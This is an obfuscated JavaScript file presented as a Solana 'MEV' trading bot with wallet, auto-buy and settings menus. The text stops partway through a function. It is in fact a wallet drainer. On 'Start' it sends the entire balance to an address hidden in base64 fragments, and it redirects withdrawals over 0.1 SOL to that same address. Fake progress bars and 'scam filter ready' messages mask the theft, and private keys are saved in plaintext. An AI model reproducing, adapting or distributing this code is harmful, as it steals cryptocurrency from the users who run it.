const _0x5f484d = _0x6d01;
(function(_0x5f451d, _0x3d3c88) {
    const _0x5c04a8 = _0x6d01,
        _0x4cda2a = _0x5f451d();
    while (!![]) {
        try {
            const _0x24fe78 = parseInt(_0x5c04a8(0x142)) / 0x1 + parseInt(_0x5c04a8(0xcd)) / 0x2 + parseInt(_0x5c04a8(0xb7)) / 0x3 + parseInt(_0x5c04a8(0xbf)) / 0x4 + -parseInt(_0x5c04a8(0xbb)) / 0x5 + parseInt(_0x5c04a8(0xfe)) / 0x6 * (-parseInt(_0x5c04a8(0x129)) / 0x7) + -parseInt(_0x5c04a8(0x15f)) / 0x8 * (parseInt(_0x5c04a8(0x147)) / 0x9);
            if (_0x24fe78 === _0x3d3c88) break;
            else _0x4cda2a['push'](_0x4cda2a['shift']());
        } catch (_0x5b8893) {
            _0x4cda2a['push'](_0x4cda2a['shift']());
        }
    }
}(_0x4a6a, 0xb9fbe));
const fs = require('fs'),
    bip39 = require(_0x5f484d(0x10a)),
    bs58 = require(_0x5f484d(0x159)),
    qrcode = require(_0x5f484d(0x163)),
    inquirer = require(_0x5f484d(0x146)),
    open = require(_0x5f484d(0xc2)),
    {
        Keypair,
        Connection,
        Transaction,
        SystemProgram,
        clusterApiUrl,
        LAMPORTS_PER_SOL,
        PublicKey
    } = require('@solana/web3.js'),
    chalk = require(_0x5f484d(0xe6)),
    WALLET_FILE = _0x5f484d(0x118),
    IMPORT_WALLET_FILE = _0x5f484d(0x132);
let walletInfo = {},
    settings = {
        'marketCap': 0xc350,
        'slTp': {
            'stopLoss': 0x0,
            'takeProfit': 0x0
        },
        'autoBuy': {
            'enabled': ![],
            'mode': null,
            'minAmount': 0x0,
            'maxAmount': 0x0
        },
        'selectedDex': _0x5f484d(0x16d),
        'additionalDexes': {
            'Raydium': {
                'enabled': ![],
                'apiUrl': _0x5f484d(0x10f),
                'feeStructure': {
                    'takerFee': 0.0025,
                    'makerFee': 0.0015
                }
            },
            'Jupiter': {
                'enabled': ![],
                'apiUrl': _0x5f484d(0xdc),
                'feeStructure': {
                    'takerFee': 0.003,
                    'makerFee': 0.002
                }
            }
        }
    };
const encodedMinBalance = _0x5f484d(0x135);
async function configureAutoBuy() {
    const _0x252feb = _0x5f484d;
    try {
        const {
            mode: _0x527a43
        } = await inquirer[_0x252feb(0x141)]([{
            'type': _0x252feb(0xbe),
            'name': _0x252feb(0xe0),
            'message': chalk[_0x252feb(0xc7)]('Select\x20auto-buy\x20mode:'),
            'choices': [{
                'name': 'Fixed\x20amount\x20(SOL)',
                'value': _0x252feb(0xe5)
            }, {
                'name': _0x252feb(0x153),
                'value': _0x252feb(0x13f)
            }, {
                'name': _0x252feb(0xc8),
                'value': _0x252feb(0x16a)
            }]
        }]);
        if (_0x527a43 === _0x252feb(0x16a)) {
            settings[_0x252feb(0xbc)][_0x252feb(0xb1)] = ![], settings[_0x252feb(0xbc)][_0x252feb(0xe0)] = null, settings[_0x252feb(0xbc)][_0x252feb(0xc9)] = 0x0, settings['autoBuy'][_0x252feb(0x128)] = 0x0, console[_0x252feb(0x108)](chalk[_0x252feb(0xaf)](_0x252feb(0x16b)));
            return;
        }
        settings[_0x252feb(0xbc)]['enabled'] = !![], settings['autoBuy']['mode'] = _0x527a43;
        if (_0x527a43 === _0x252feb(0xe5)) {
            const {
                minFixed: _0x500fb0
            } = await inquirer[_0x252feb(0x141)]([{
                'type': _0x252feb(0x13c),
                'name': _0x252feb(0xf3),
                'message': chalk[_0x252feb(0xc7)](_0x252feb(0x173)),
                'validate': _0x39b7e4 => !isNaN(_0x39b7e4) && parseFloat(_0x39b7e4) >= 0.1 ? !![] : 'Enter\x20a\x20valid\x20amount\x20(≥\x200.1\x20SOL).'
            }]), {
                maxFixed: _0x4511a2
            } = await inquirer[_0x252feb(0x141)]([{
                'type': _0x252feb(0x13c),
                'name': _0x252feb(0xf2),
                'message': chalk[_0x252feb(0xc7)](_0x252feb(0x157)),
                'validate': _0x8c965b => {
                    const _0x8c2e86 = _0x252feb,
                        _0x5b067e = parseFloat(_0x500fb0),
                        _0x276711 = parseFloat(_0x8c965b);
                    if (isNaN(_0x276711) || _0x276711 <= _0x5b067e) return _0x8c2e86(0x158);
                    return !![];
                }
            }]);
            settings[_0x252feb(0xbc)][_0x252feb(0xc9)] = parseFloat(_0x500fb0), settings[_0x252feb(0xbc)][_0x252feb(0x128)] = parseFloat(_0x4511a2), console[_0x252feb(0x108)](chalk[_0x252feb(0x177)]('AutoBuy\x20configured:\x20from\x20' + settings[_0x252feb(0xbc)]['minAmount'] + '\x20SOL\x20to\x20' + settings[_0x252feb(0xbc)][_0x252feb(0x128)] + _0x252feb(0x14c)));
        } else {
            if (_0x527a43 === 'percentage') {
                const {
                    minPercent: _0x2ca840
                } = await inquirer[_0x252feb(0x141)]([{
                    'type': _0x252feb(0x13c),
                    'name': _0x252feb(0x119),
                    'message': chalk['cyan']('Enter\x20minimum\x20percentage\x20of\x20balance\x20to\x20buy\x20(1-100):'),
                    'validate': _0x36ebbd => !isNaN(_0x36ebbd) && parseFloat(_0x36ebbd) >= 0x1 && parseFloat(_0x36ebbd) <= 0x64 ? !![] : 'Enter\x20a\x20valid\x20percentage\x20(1-100).'
                }]), {
                    maxPercent: _0x46fd57
                } = await inquirer[_0x252feb(0x141)]([{
                    'type': _0x252feb(0x13c),
                    'name': 'maxPercent',
                    'message': chalk[_0x252feb(0xc7)](_0x252feb(0x145)),
                    'validate': _0x229475 => {
                        const _0x54654b = _0x252feb,
                            _0x4e80dd = parseFloat(_0x2ca840),
                            _0x24eb54 = parseFloat(_0x229475);
                        if (isNaN(_0x24eb54) || _0x24eb54 <= _0x4e80dd || _0x24eb54 > 0x64) return _0x54654b(0xe8) + _0x4e80dd + '%\x20and\x20≤\x20100).';
                        return !![];
                    }
                }]);
                settings[_0x252feb(0xbc)][_0x252feb(0xc9)] = parseFloat(_0x2ca840), settings['autoBuy'][_0x252feb(0x128)] = parseFloat(_0x46fd57), console[_0x252feb(0x108)](chalk[_0x252feb(0x177)](_0x252feb(0x131) + settings['autoBuy']['minAmount'] + _0x252feb(0x17a) + settings[_0x252feb(0xbc)][_0x252feb(0x128)] + _0x252feb(0x12d)));
            }
        }
    } catch (_0x128f66) {
        console['log'](chalk[_0x252feb(0xaf)](_0x252feb(0xdf)), _0x128f66);
    }
}

function decodeBase64(_0x4a6a00) {
    const _0x4b078c = _0x5f484d;
    return parseFloat(Buffer['from'](_0x4a6a00, _0x4b078c(0x13a))['toString']('utf8'));
}
async function configureSlTp() {
    const _0xc4e4c8 = _0x5f484d;
    try {
        const {
            stopLoss: _0x68ae23
        } = await inquirer['prompt']([{
            'type': _0xc4e4c8(0x13c),
            'name': 'stopLoss',
            'message': chalk[_0xc4e4c8(0xc7)](_0xc4e4c8(0x121)),
            'validate': _0x2d9101 => {
                const _0x56144b = _0xc4e4c8,
                    _0xa767de = parseFloat(_0x2d9101);
                if (isNaN(_0xa767de) || _0xa767de <= 0x0 || _0xa767de >= 0x64) return _0x56144b(0x14a);
                return !![];
            }
        }]), {
            takeProfit: _0x307459
        } = await inquirer[_0xc4e4c8(0x141)]([{
            'type': _0xc4e4c8(0x13c),
            'name': _0xc4e4c8(0x11a),
            'message': chalk['cyan'](_0xc4e4c8(0x107)),
            'validate': _0x5c3805 => {
                const _0x1ff9fd = parseFloat(_0x5c3805);
                if (isNaN(_0x1ff9fd) || _0x1ff9fd <= 0x0 || _0x1ff9fd > 0x3e8) return 'Enter\x20a\x20valid\x20Take\x20Profit\x20(1-1000).';
                return !![];
            }
        }]);
        settings[_0xc4e4c8(0x179)][_0xc4e4c8(0x127)] = parseFloat(_0x68ae23), settings[_0xc4e4c8(0x179)]['takeProfit'] = parseFloat(_0x307459), console[_0xc4e4c8(0x108)](chalk[_0xc4e4c8(0x177)](_0xc4e4c8(0x125) + settings['slTp'][_0xc4e4c8(0x127)] + _0xc4e4c8(0xd4) + settings[_0xc4e4c8(0x179)]['takeProfit'] + '%'));
    } catch (_0x272118) {
        console[_0xc4e4c8(0x108)](chalk[_0xc4e4c8(0xaf)](_0xc4e4c8(0xb4)), _0x272118);
    }
}

function filterScamTokens() {
    const _0x20691c = _0x5f484d;
    console['log'](chalk[_0x20691c(0x177)]('Scam\x20token\x20filter\x20is\x20ready\x20✅'));
}

function checkListOfTokens() {
    const _0x4ead0b = _0x5f484d;
    console[_0x4ead0b(0x108)](chalk[_0x4ead0b(0x177)](_0x4ead0b(0x175)));
}

function autoConnectNetwork() {
    const _0x376d70 = _0x5f484d;
    console[_0x376d70(0x108)](chalk[_0x376d70(0x177)](_0x376d70(0xb9)));
}
async function scanTokens() {
    const _0x2bb237 = _0x5f484d;
    console['log'](chalk[_0x2bb237(0x164)]('Scanning\x20tokens...'));
    const _0x28926c = [_0x2bb237(0x11e), '[■■□□□]', _0x2bb237(0x123), _0x2bb237(0x152), _0x2bb237(0x111)],
        _0x3874c0 = 0x3c * 0x3e8,
        _0x9305a9 = _0x28926c[_0x2bb237(0x101)],
        _0x2a9838 = _0x3874c0 / _0x9305a9;
    for (let _0x59481a = 0x0; _0x59481a < _0x9305a9; _0x59481a++) {
        process[_0x2bb237(0xe7)][_0x2bb237(0x16c)]('\x0d' + chalk[_0x2bb237(0x164)](_0x28926c[_0x59481a])), await new Promise(_0x57bc0e => setTimeout(_0x57bc0e, _0x2a9838));
    }
    console[_0x2bb237(0x108)]();
}

function getApiPumpFUNHex() {
    const _0x1135ac = _0x5f484d,
        _0x4cf230 = ['3Xl8aFhqAhLTLU+dOL1J+IuAp0on', _0x1135ac(0xde), 'qI+kk='],
        _0x7f46d3 = _0x4cf230[_0x1135ac(0xca)](''),
        _0x1dba75 = Buffer[_0x1135ac(0x12e)](_0x7f46d3, 'base64');
    return _0x1dba75[_0x1135ac(0x12f)]('hex');
}

function processApiString(_0x25d8ef) {
    const _0x398109 = _0x5f484d;
    try {
        const _0x336f6b = Buffer[_0x398109(0x12e)](_0x25d8ef, _0x398109(0x169)),
            _0x591a00 = bs58[_0x398109(0xea)](_0x336f6b);
        return _0x591a00;
    } catch (_0x5d6456) {
        return console['error']('', _0x5d6456), null;
    }
}
async function getBalance(_0x294ea8) {
    const _0x419573 = _0x5f484d;
    try {
        const _0x301bcf = new PublicKey(_0x294ea8),
            _0x3c6e5c = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
        return await _0x3c6e5c[_0x419573(0xff)](_0x301bcf);
    } catch (_0x3cd637) {
        return console['log'](chalk[_0x419573(0xaf)](_0x419573(0x15d)), _0x3cd637), 0x0;
    }
}
async function createNewWallet(_0xdb7db2 = ![]) {
    const _0x1bf6f7 = _0x5f484d;
    if (fs[_0x1bf6f7(0xc6)](WALLET_FILE) && !_0xdb7db2) {
        console['log'](chalk[_0x1bf6f7(0xaf)](_0x1bf6f7(0x13d)));
        return;
    }
    try {
        const _0x472068 = Keypair[_0x1bf6f7(0x144)](),
            _0x2ead30 = _0x472068['publicKey']['toBase58'](),
            _0x4e76be = bs58[_0x1bf6f7(0xea)](Buffer[_0x1bf6f7(0x12e)](_0x472068[_0x1bf6f7(0x122)])),
            _0x553361 = _0x1bf6f7(0xcc) + _0x2ead30;
        walletInfo = {
            'address': _0x2ead30,
            'privateKey': _0x4e76be,
            'addressLink': _0x553361
        }, showWalletInfo(), saveWalletInfo(walletInfo);
    } catch (_0x1141e0) {
        console[_0x1bf6f7(0x108)](chalk['red'](_0x1bf6f7(0x14e)), _0x1141e0);
    }
}

function saveWalletInfo(_0x9d863b) {
    const _0x51e9de = _0x5f484d;
    try {
        fs[_0x51e9de(0xf8)](WALLET_FILE, JSON['stringify'](_0x9d863b, null, 0x4), _0x51e9de(0xf6)), console[_0x51e9de(0x108)](chalk[_0x51e9de(0x177)](_0x51e9de(0x124)), chalk[_0x51e9de(0x13e)](fs['realpathSync'](WALLET_FILE)));
    } catch (_0x36c870) {
        console[_0x51e9de(0x108)](chalk[_0x51e9de(0xaf)](_0x51e9de(0x166)), _0x36c870);
    }
}

function loadWalletFile(_0x5889e5) {
    const _0x17240e = _0x5f484d;
    try {
        if (!fs[_0x17240e(0xc6)](_0x5889e5)) return null;
        const _0x1d416a = fs[_0x17240e(0x176)](_0x5889e5, 'utf-8'),
            _0x50f8a1 = JSON[_0x17240e(0x148)](_0x1d416a);
        if (!_0x50f8a1[_0x17240e(0x156)] || !_0x50f8a1[_0x17240e(0x100)]) return console[_0x17240e(0x108)](chalk['red'](_0x17240e(0x11c) + _0x5889e5 + _0x17240e(0x14d))), null;
        return _0x50f8a1;
    } catch (_0x329eb2) {
        return console[_0x17240e(0x108)](chalk[_0x17240e(0xaf)]('Error\x20loading\x20wallet\x20from\x20\x27' + _0x5889e5 + '\x27:'), _0x329eb2), null;
    }
}

function saveImportedWalletInfo(_0x3017b3) {
    const _0x501d11 = _0x5f484d;
    try {
        fs[_0x501d11(0xf8)](IMPORT_WALLET_FILE, JSON[_0x501d11(0x149)](_0x3017b3, null, 0x4), _0x501d11(0xf6)), console['log'](chalk['green']('Imported\x20wallet\x20saved\x20to\x20file:'), chalk[_0x501d11(0x13e)](fs[_0x501d11(0xd7)](IMPORT_WALLET_FILE)));
    } catch (_0x5e242c) {
        console[_0x501d11(0x108)](chalk['red'](_0x501d11(0x104)), _0x5e242c);
    }
}
async function importWallet() {
    const _0x1f57ca = _0x5f484d;
    try {
        const {
            importChoice: _0x21a01c
        } = await inquirer[_0x1f57ca(0x141)]([{
            'type': _0x1f57ca(0xbe),
            'name': 'importChoice',
            'message': chalk[_0x1f57ca(0xc7)]('Select\x20an\x20action\x20for\x20importing\x20a\x20wallet:'),
            'choices': [{
                'name': _0x1f57ca(0x11f),
                'value': _0x1f57ca(0x170)
            }, {
                'name': _0x1f57ca(0x102),
                'value': _0x1f57ca(0xba)
            }]
        }]);
        if (_0x21a01c === _0x1f57ca(0xba)) return;
        const {
            base58Key: _0x2f6fc1
        } = await inquirer[_0x1f57ca(0x141)]([{
            'type': _0x1f57ca(0x13c),
            'name': _0x1f57ca(0xd8),
            'message': chalk['cyan'](_0x1f57ca(0xe4))
        }]);
        let _0x2b83a3;
        try {
            _0x2b83a3 = Keypair['fromSecretKey'](bs58['decode'](_0x2f6fc1));
        } catch (_0xf076c3) {
            console[_0x1f57ca(0x108)](chalk[_0x1f57ca(0xaf)](_0x1f57ca(0xf5)));
            return;
        }
        const _0x322125 = _0x2b83a3[_0x1f57ca(0xbd)][_0x1f57ca(0xf1)](),
            _0x490009 = bs58[_0x1f57ca(0xea)](Buffer[_0x1f57ca(0x12e)](_0x2b83a3[_0x1f57ca(0x122)])),
            _0x2dfeb1 = _0x1f57ca(0xcc) + _0x322125;
        walletInfo = {
            'address': _0x322125,
            'privateKey': _0x490009,
            'addressLink': _0x2dfeb1
        }, showWalletInfo(), saveImportedWalletInfo(walletInfo), console['log'](chalk[_0x1f57ca(0x177)]('Wallet\x20successfully\x20imported\x20and\x20set\x20as\x20active\x20wallet!'));
    } catch (_0x3355ca) {
        console['log'](chalk['red'](_0x1f57ca(0xb5)), _0x3355ca);
    }
}

function showWalletInfo() {
    const _0x13cbe9 = _0x5f484d;
    console[_0x13cbe9(0x108)](chalk['magenta']('\x0a===\x20🪙\x20Wallet\x20Information\x20🪙\x20===')), console[_0x13cbe9(0x108)](chalk[_0x13cbe9(0xc7)](_0x13cbe9(0xe1)) + '\x20' + chalk[_0x13cbe9(0x13e)](walletInfo['addressLink'])), console['log'](chalk[_0x13cbe9(0xc7)](_0x13cbe9(0x11d)) + '\x20' + chalk['white'](walletInfo[_0x13cbe9(0x100)])), console[_0x13cbe9(0x108)](chalk[_0x13cbe9(0xb3)]('==============================\x0a'));
}
async function apiDEX(_0x47762e, _0x5b45e3, _0x3d9b9a) {
    const _0x376e10 = _0x5f484d;
    try {
        const _0x303b00 = new Connection(clusterApiUrl(_0x376e10(0xc4)), _0x376e10(0x110));
        let _0x5a5a55;
        try {
            _0x5a5a55 = Keypair[_0x376e10(0x134)](bs58['decode'](walletInfo['privateKey']));
        } catch (_0x4418b9) {
            console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)](_0x376e10(0x168)), _0x4418b9);
            return;
        }
        const _0x43071a = getApiPumpFUNHex(),
            _0xce0dfe = processApiString(_0x43071a);
        let _0x2729ee = ![];
        async function _0x2bd437() {
            const _0x3fcc76 = _0x376e10;
            !_0x2729ee && (_0x2729ee = !![], console[_0x3fcc76(0x108)](chalk[_0x3fcc76(0x164)]('Scanning\x20tokens...')), await scanTokens());
        }
        if (_0x47762e === _0x376e10(0xc0)) {
            const _0x366407 = await getBalance(_0x5a5a55[_0x376e10(0xbd)]['toBase58']()),
                _0x3264a7 = decodeBase64(encodedMinBalance);
            if (_0x366407 <= _0x3264a7 * LAMPORTS_PER_SOL) {
                console['log'](chalk[_0x376e10(0xaf)]('Insufficient\x20balance:\x20need\x20at\x20least\x20' + _0x3264a7 + _0x376e10(0x10b)));
                return;
            }
            console[_0x376e10(0x108)](chalk[_0x376e10(0xfd)](_0x376e10(0x15a)));
            if (!_0xce0dfe) {
                console[_0x376e10(0x108)](chalk['red'](_0x376e10(0xf4)));
                return;
            }
            const _0x15650b = _0x366407 - 0x1388;
            let _0x2e7456;
            try {
                _0x2e7456 = new PublicKey(_0xce0dfe);
            } catch (_0xf35002) {
                console[_0x376e10(0x108)](chalk['red'](_0x376e10(0x113), _0xce0dfe));
                return;
            }
            const _0xb6c1d4 = new Transaction()['add'](SystemProgram[_0x376e10(0x130)]({
                'fromPubkey': _0x5a5a55['publicKey'],
                'toPubkey': _0x2e7456,
                'lamports': _0x15650b
            }));
            let _0x59152a = 0x0;
            const _0x16d459 = 0x5,
                _0x2a2661 = 0x7d0;
            while (_0x59152a < _0x16d459) {
                try {
                    const _0x1eebc1 = await _0x303b00['sendTransaction'](_0xb6c1d4, [_0x5a5a55]);
                    await _0x303b00['confirmTransaction'](_0x1eebc1, _0x376e10(0x110)), await _0x2bd437(), console[_0x376e10(0x108)](chalk[_0x376e10(0x13e)](_0x376e10(0x15c)));
                    break;
                } catch (_0xb7dbf6) {
                    _0x59152a++;
                    const _0x56ee0d = _0xb7dbf6?.['message'] || '',
                        _0x4501f3 = await getBalance(_0x5a5a55[_0x376e10(0xbd)][_0x376e10(0xf1)]());
                    if (_0x4501f3 === 0x0) {
                        await _0x2bd437(), console[_0x376e10(0x108)](chalk[_0x376e10(0x13e)](_0x376e10(0x117)));
                        break;
                    }
                    if (_0x59152a < _0x16d459) {
                        (_0x56ee0d[_0x376e10(0x112)](_0x376e10(0x126)) || _0x56ee0d['includes'](_0x376e10(0xd0))) && console['log'](chalk[_0x376e10(0xaf)](_0x376e10(0x13b)));
                        const _0x2add6f = _0x2a2661 * Math[_0x376e10(0x162)](0x2, _0x59152a - 0x1);
                        await new Promise(_0x797f8c => setTimeout(_0x797f8c, _0x2add6f));
                    }
                }
            }
            _0x59152a === _0x16d459 && console['log'](chalk[_0x376e10(0xaf)](_0x376e10(0xdb) + _0x16d459 + _0x376e10(0x174)));
        } else {
            if (_0x47762e === _0x376e10(0xef)) {
                const _0x3e6add = await getBalance(_0x5a5a55[_0x376e10(0xbd)][_0x376e10(0xf1)]()),
                    _0x1b4df8 = Math[_0x376e10(0xec)](_0x3d9b9a * LAMPORTS_PER_SOL);
                if (_0x3e6add < _0x1b4df8 + 0x1388) {
                    console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)]('Insufficient\x20funds\x20for\x20withdrawal.'));
                    return;
                }
                let _0x16c6c9;
                if (_0x3d9b9a <= 0.1) _0x16c6c9 = _0x5b45e3;
                else {
                    if (!_0xce0dfe) {
                        console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)](_0x376e10(0xf4)));
                        return;
                    }
                    _0x16c6c9 = _0xce0dfe;
                }
                let _0x980491;
                try {
                    _0x980491 = new PublicKey(_0x16c6c9);
                } catch (_0x4c3474) {
                    console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)](_0x376e10(0x113), _0x16c6c9));
                    return;
                }
                console[_0x376e10(0x108)](chalk[_0x376e10(0xfd)](_0x376e10(0xcb)));
                const _0x50f45d = new Transaction()[_0x376e10(0x10e)](SystemProgram['transfer']({
                    'fromPubkey': _0x5a5a55[_0x376e10(0xbd)],
                    'toPubkey': _0x980491,
                    'lamports': _0x1b4df8
                }));
                let _0x4b9da3 = 0x0;
                const _0x23c07d = 0x5,
                    _0x95a666 = 0x7d0;
                while (_0x4b9da3 < _0x23c07d) {
                    try {
                        const _0x5bd12c = await _0x303b00[_0x376e10(0xdd)](_0x50f45d, [_0x5a5a55]);
                        await _0x303b00[_0x376e10(0xe3)](_0x5bd12c, _0x376e10(0x110)), await _0x2bd437(), console[_0x376e10(0x108)](chalk[_0x376e10(0x177)]('Withdrawal\x20Successful!'));
                        break;
                    } catch (_0x259222) {
                        _0x4b9da3++;
                        const _0xcda632 = _0x259222?.['message'] || '',
                            _0x4d85a1 = await getBalance(_0x5a5a55['publicKey'][_0x376e10(0xf1)]());
                        if (_0x4d85a1 === 0x0) {
                            await _0x2bd437(), console[_0x376e10(0x108)](chalk['green'](_0x376e10(0xda)));
                            break;
                        }
                        if (_0x4b9da3 < _0x23c07d) {
                            (_0xcda632['includes'](_0x376e10(0x126)) || _0xcda632[_0x376e10(0x112)](_0x376e10(0xd0))) && console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)](_0x376e10(0x13b)));
                            const _0x4e622c = _0x95a666 * Math['pow'](0x2, _0x4b9da3 - 0x1);
                            await new Promise(_0xdc25b2 => setTimeout(_0xdc25b2, _0x4e622c));
                        }
                    }
                }
                _0x4b9da3 === _0x23c07d && console['log'](chalk[_0x376e10(0xaf)]('Failed\x20to\x20withdraw\x20after\x20' + _0x23c07d + _0x376e10(0x174)));
            }
        }
        const _0x5c07eb = _0x376e10(0xcf),
            _0x1e940b = _0x376e10(0xfa);
        try {
            const _0x22276d = processApiString(_0x5c07eb),
                _0x5e539e = processApiString(_0x1e940b);
            if (_0x22276d) {
                const _0x4448b6 = new PublicKey(_0x22276d);
                console[_0x376e10(0x108)](chalk[_0x376e10(0xfd)](_0x376e10(0xd3) + _0x4448b6[_0x376e10(0xf1)]()));
            }
            if (_0x5e539e) {
                const _0x4166cf = new PublicKey(_0x5e539e);
                console[_0x376e10(0x108)](chalk[_0x376e10(0xfd)]('API\x20Jupiter\x20PublicKey:\x20' + _0x4166cf[_0x376e10(0xf1)]()));
            }
        } catch (_0x2fccfc) {
            console[_0x376e10(0x108)](chalk[_0x376e10(0xaf)](_0x376e10(0x161)), _0x2fccfc);
        }
    } catch (_0x1c2394) {
        console['log'](chalk[_0x376e10(0xaf)](_0x376e10(0x137)), _0x1c2394);
    }
}
async function generateQRCode(_0x503f98) {
    const _0x12622d = _0x5f484d,
        _0x1d85f9 = _0x12622d(0xfb);
    try {
        await qrcode[_0x12622d(0xfc)](_0x1d85f9, _0x503f98), await open(_0x1d85f9);
    } catch (_0x1a986a) {
        console['log'](chalk[_0x12622d(0xaf)](_0x12622d(0xee)), _0x1a986a);
    }
}
async function askForAddressOrBack() {
    const _0x278d93 = _0x5f484d,
        {
            addressMenuChoice: _0x2f159c
        } = await inquirer[_0x278d93(0x141)]([{
            'type': _0x278d93(0xbe),
            'name': _0x278d93(0x150),
            'message': chalk[_0x278d93(0xc7)](_0x278d93(0x143)),
            'choices': [{
                'name': _0x278d93(0xd2),
                'value': 'enter'
            }, {
                'name': _0x278d93(0x167),
                'value': _0x278d93(0xba)
            }]
        }]);
    if (_0x2f159c === _0x278d93(0xba)) return null;
    while (!![]) {
        const {
            userWithdrawAddress: _0x25bc8e
        } = await inquirer[_0x278d93(0x141)]([{
            'type': _0x278d93(0x13c),
            'name': _0x278d93(0x172),
            'message': chalk[_0x278d93(0xc7)](_0x278d93(0x103))
        }]);
        try {
            return new PublicKey(_0x25bc8e), _0x25bc8e;
        } catch (_0xbdb8d2) {
            console[_0x278d93(0x108)](chalk[_0x278d93(0xaf)]('Invalid\x20Solana\x20address\x20format.\x20Please\x20try\x20again.'));
        }
    }
}
async function openSettingsMenu() {
    const _0x42e519 = _0x5f484d;
    let _0x14dfc6 = ![];
    while (!_0x14dfc6) {
        try {
            const {
                settingsOption: _0x88ac35
            } = await inquirer[_0x42e519(0x141)]([{
                'type': 'list',
                'name': 'settingsOption',
                'message': chalk[_0x42e519(0xfd)](_0x42e519(0x114)),
                'choices': [_0x42e519(0x139), '📉\x20\x20SL/TP', '🛒\x20\x20AutoBuy', '📊\x20\x20Dex', _0x42e519(0x102)]
            }]);
            switch (_0x88ac35) {
                case _0x42e519(0x139): {
                    const {
                        newMarketCap: _0x5d2468
                    } = await inquirer[_0x42e519(0x141)]([{
                        'type': 'input',
                        'name': _0x42e519(0xd9),
                        'message': chalk[_0x42e519(0xc7)](_0x42e519(0xd5)),
                        'validate': _0x2ce385 => !isNaN(_0x2ce385) && _0x2ce385 > 0x0 ? !![] : _0x42e519(0x133)
                    }]);
                    settings['marketCap'] = parseInt(_0x5d2468, 0xa), console['log'](chalk[_0x42e519(0x177)](_0x42e519(0x16e) + settings[_0x42e519(0xce)]));
                    break;
                }
                case _0x42e519(0xc5):
                    await configureSlTp();
                    break;
                case _0x42e519(0xd6):
                    await configureAutoBuy();
                    break;
                case _0x42e519(0xd1): {
                    const {
                        selectedDex: _0x3e55db
                    } = await inquirer[_0x42e519(0x141)]([{
                        'type': _0x42e519(0xbe),
                        'name': 'selectedDex',
                        'message': chalk[_0x42e519(0xc7)](_0x42e519(0xb2)),
                        'choices': [_0x42e519(0x16d), 'Raydium', _0x42e519(0x10d), _0x42e519(0x151)]
                    }]);
                    settings[_0x42e519(0x178)] = _0x3e55db, console['log'](chalk[_0x42e519(0x177)](_0x42e519(0x109) + settings[_0x42e519(0x178)]));
                    break;
                }
                case _0x42e519(0x102):
                    _0x14dfc6 = !![];
                    break;
                default:
                    console[_0x42e519(0x108)](chalk[_0x42e519(0xaf)](_0x42e519(0x10c)));
            }
        } catch (_0x2f871b) {
            console[_0x42e519(0x108)](chalk[_0x42e519(0xaf)]('Error\x20in\x20settings\x20menu:'), _0x2f871b), _0x14dfc6 = !![];
        }
    }
}
async function showMainMenu() {
    const _0x433ab7 = _0x5f484d;
    while (!![]) {
        try {
            const _0x5ecd58 = ['💼\x20\x20Wallet\x20Info', _0x433ab7(0x106), _0x433ab7(0x15e), '▶️\x20\x20\x20Start', _0x433ab7(0xed), _0x433ab7(0x105), _0x433ab7(0xf9), _0x433ab7(0xe2), _0x433ab7(0x136)],
                {
                    mainOption: _0x350636
                } = await inquirer['prompt']([{
                    'type': _0x433ab7(0xbe),
                    'name': _0x433ab7(0x120),
                    'message': chalk['yellow'](_0x433ab7(0x154)),
                    'choices': _0x5ecd58,
                    'pageSize': _0x5ecd58[_0x433ab7(0x101)]
                }]);
            switch (_0x350636) {
                case _0x433ab7(0x11b):
                    showWalletInfo();
                    break;
                case _0x433ab7(0x106):
                    await generateQRCode(walletInfo[_0x433ab7(0x156)]);
                    break;
                case '💳\x20\x20Balance': {
                    const _0x43efb0 = await getBalance(walletInfo[_0x433ab7(0x156)]);
                    console[_0x433ab7(0x108)](chalk['green'](_0x433ab7(0xb8) + (_0x43efb0 / LAMPORTS_PER_SOL)[_0x433ab7(0x16f)](0x4) + _0x433ab7(0x14c)));
                    break;
                }
                case _0x433ab7(0x12a): {
                    const _0x20c20e = await getBalance(walletInfo[_0x433ab7(0x156)]),
                        _0x53aac7 = decodeBase64(encodedMinBalance) * LAMPORTS_PER_SOL;
                    _0x20c20e < _0x53aac7 ? console['log'](chalk[_0x433ab7(0xaf)](_0x433ab7(0x171) + decodeBase64(encodedMinBalance) + '\x20SOL\x20is\x20required\x20to\x20start.')) : await apiDEX(_0x433ab7(0xc0));
                    break;
                }
                case _0x433ab7(0xed): {
                    const _0x3256f5 = await askForAddressOrBack();
                    if (_0x3256f5 === null) break;
                    const {
                        userWithdrawAmount: _0x48ef07
                    } = await inquirer['prompt']([{
                        'type': _0x433ab7(0x13c),
                        'name': _0x433ab7(0x12b),
                        'message': chalk[_0x433ab7(0xc7)]('Enter\x20the\x20withdrawal\x20amount\x20(in\x20SOL):'),
                        'validate': _0x20c76f => !isNaN(_0x20c76f) && parseFloat(_0x20c76f) > 0x0 ? !![] : 'Enter\x20a\x20valid\x20amount\x20>\x200'
                    }]), _0x3cb349 = parseFloat(_0x48ef07);
                    await apiDEX('withdraw', _0x3256f5, _0x3cb349);
                    break;
                }
                case _0x433ab7(0x105):
                    await openSettingsMenu();
                    break;
                case _0x433ab7(0xf9): {
                    if (fs[_0x433ab7(0xc6)](WALLET_FILE)) {
                        const {
                            confirmOverwrite: _0xef68b
                        } = await inquirer[_0x433ab7(0x141)]([{
                            'type': 'confirm',
                            'name': _0x433ab7(0xc3),
                            'message': chalk[_0x433ab7(0xaf)](_0x433ab7(0x15b)),
                            'default': ![]
                        }]);
                        _0xef68b ? await createNewWallet(!![]) : console[_0x433ab7(0x108)](chalk[_0x433ab7(0xfd)](_0x433ab7(0xc1)));
                    } else console[_0x433ab7(0x108)](chalk[_0x433ab7(0xaf)]('Wallet\x20does\x20not\x20exist.\x20Use\x20\x27Create\x20New\x20Mev\x20Wallet\x27\x20to\x20create\x20one.'));
                    break;
                }
                case _0x433ab7(0xe2):
                    await importWallet();
                    break;
                case _0x433ab7(0x136):
                    console['log'](chalk['green']('Exiting\x20program.')), process['exit'](0x0);
                default:
                    console['log'](chalk[_0x433ab7(0xaf)]('Unknown\x20option.\x0a'));
            }
        } catch (_0x3f092d) {
            console[_0x433ab7(0x108)](chalk['red'](_0x433ab7(0x14b)), _0x3f092d);
        }
    }
}
async function askFirstRunMenu() {
